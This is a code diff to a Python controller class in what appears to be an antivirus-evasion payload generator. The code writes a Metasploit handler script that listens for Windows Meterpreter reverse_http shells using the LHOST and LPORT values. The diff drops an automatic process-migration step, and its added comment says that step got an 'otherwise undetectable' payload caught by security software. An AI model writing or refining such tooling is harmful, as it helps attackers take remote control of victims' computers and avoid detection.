@@ -469,8 +469,9 @@ class Controller:
                 if len(parts) > 0:
                     handler += "set LPORT " + parts[0] + "\n"
 
+                # Removed autoscript smart migrate due to users on forum saying that migrate itself caused detection
+                # in an otherwise undetectable (at the time) payload
                 handler += "set ExitOnSession false\n"
-                handler += "set AutoRunScript post/windows/manage/smart_migrate\n"
                 handler += "exploit -j\n"
 
             # print out any msfvenom options we used in shellcode generation if specified
@@ -528,15 +529,14 @@ class Controller:
                         handler += "set PAYLOAD windows/meterpreter/reverse_http\n"
                     else: pass
 
-                    # grab the LHOST value
-                    handler += "set LHOST " + payload.required_options["LHOST"][0] + "\n"
+                # grab the LHOST value
+                handler += "set LHOST " + payload.required_options["LHOST"][0] + "\n"
 
                 # grab the LPORT value if it was set
                 if "LPORT" in keys:
                     handler += "set LPORT " + payload.required_options["LPORT"][0] + "\n"
 
                 handler += "set ExitOnSession false\n"
-                handler += "set AutoRunScript post/windows/manage/smart_migrate\n"
                 handler += "exploit -j\n"
 
         message += "\n Payload File:\t\t"+OutputFileName + "\n"
